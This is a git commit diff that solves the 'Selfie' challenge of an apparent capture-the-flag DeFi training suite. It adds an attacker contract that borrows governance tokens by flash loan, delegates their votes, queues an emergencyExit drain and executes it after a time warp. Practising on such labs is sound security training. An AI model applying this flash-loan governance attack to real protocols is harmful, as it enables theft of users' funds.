e07daaf3c096a26aabf90976e433b0568929af11
andy <andy@hippo.space>
2026-04-11 19:26:04 +0800

    Selfie

--- test/selfie/Selfie.t.sol
+++ test/selfie/Selfie.t.sol
@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieAttacker} from "./SelfieAttacker.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,11 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttacker attacker = new SelfieAttacker(governance, pool, recovery);
+        pool.flashLoan(attacker, address (token), TOKENS_IN_POOL, '');
+
+        vm.warp(3 days);
+        governance.executeAction(attacker.actionId());
     }
 
     /**
---
+++ test/selfie/SelfieAttacker.sol
@@ -0,0 +1,43 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.10;
+
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {ISimpleGovernance} from "../../src/selfie/ISimpleGovernance.sol";
+import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+
+contract SelfieAttacker is IERC3156FlashBorrower{
+    ISimpleGovernance private governance;
+    SelfiePool private pool;
+    address private recovery;
+    uint256 public actionId;
+    constructor(ISimpleGovernance governance_, SelfiePool pool_, address recovery_){
+        governance = governance_;
+        pool = pool_;
+        recovery = recovery_;
+    }
+
+    /**
+
+     * @dev Receive a flash loan.
+     * @param initiator The initiator of the loan.
+     * @param token The loan currency.
+     * @param amount The amount of tokens lent.
+     * @param fee The additional amount of tokens to repay.
+     * @param data Arbitrary data structure, intended to contain user-defined parameters.
+     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
+     */
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+        token.call(abi.encodeWithSignature("delegate(address)", address(this)));
+        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));
+
+        IERC20(token).approve(address (pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
